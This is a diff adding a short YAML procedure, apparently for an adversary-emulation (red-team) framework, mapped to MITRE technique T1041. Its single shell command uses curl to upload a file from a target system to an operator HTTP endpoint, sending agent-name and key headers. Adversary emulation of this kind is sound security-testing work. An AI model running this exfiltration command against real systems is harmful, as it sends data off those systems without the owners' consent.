@@ -1,0 +1,20 @@
+id: a978e46f-af3f-45c0-962d-157cbceda5d0
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags:
+    - Crown Jewels
+name: Collect artifact (HTTP)
+description: |
+  Upload a file from a target system to the Operator HTTP endpoint using a PUT request. This procedures uses a header
+  to apply the artifact to the correct agent.
+tactic: exfiltration
+technique:
+  id: T1041
+  name: Exfiltration Over Command and Control Channel
+platforms:
+  global:
+    sh:
+      command: |
+        curl #{operator.http} --upload-file #{ui.fact} -H "agent:#{agent.name}" -H "key:#{operator.key}" --max-time 10
